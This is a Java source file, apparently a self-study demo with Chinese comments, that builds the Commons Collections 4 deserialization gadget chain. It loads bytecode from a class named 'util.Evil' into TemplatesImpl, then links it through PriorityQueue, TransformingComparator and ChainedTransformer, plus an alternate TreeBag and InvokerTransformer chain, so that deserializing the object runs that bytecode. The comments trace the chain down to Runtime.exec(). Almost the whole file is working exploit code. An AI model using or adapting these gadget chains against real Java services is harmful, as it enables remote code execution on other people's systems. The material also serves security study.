package vuln;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import util.SerializeUtil;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.TreeMap;

/** cc4的测试环境
 * jdk7
 * cc版本: 4.0
 *
 * **/
public class Commoncollections4 {
    public static void main(String[] args) throws Exception {
//        vulncc4ToTreeBagAndTreeMap();
        vulncc4();
    }
    /** cc4的调用链结合了cc2和cc3 2+3 = 4  ...
     * ObjectInputStream.readObject()
     * ...
     * PriorityQueue.readObject()
     * PriorityQueue.heapify()
     * PriorityQueue.siftDown()
     * PriorityQueue.siftDownUsingComparator()
     * TransformingComparator.compare()
     * ChainedTransformer.transform()
     * ConstantTransformer.transform()
     * InstantiateTransformer.transform()
     * TrAXFilter.()
     * TemplatesImpl.newTransformer()
     * ...
     * Runtime.exec()
     *
     *
     * **/
    public static void vulncc4() throws NoSuchFieldException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, ClassNotFoundException {
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(1);
        CtClass ctClass = ClassPool.getDefault().get("util.Evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates, "_name", "aaa");
        SerializeUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        SerializeUtil.setFieldValue(priorityQueue,"comparator",transformingComparator);

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = templates;
        SerializeUtil.writeObjectToFile(priorityQueue);
        SerializeUtil.readObjectToFile();
    }

    /** 这条链子自己调试的时候发现触发点并不是readObject,而是add方法,可能是自己水平问题,暂时没有细分析
     *
     * **/
    public static void vulncc4ToTreeBagAndTreeMap() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass evil_payload = pool.get("util.Evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates, "_name", "aaa");
        SerializeUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates, "_bytecodes", new byte[][]{evil_payload.toBytecode()});

        InvokerTransformer invokerTransformer = new InvokerTransformer("toString", null, null);
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);

        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(templates);
        SerializeUtil.setFieldValue(invokerTransformer,"iMethodName","newTransformer");

        SerializeUtil.writeObjectToFile(treeBag);
        SerializeUtil.readObjectToFile();

    }
}
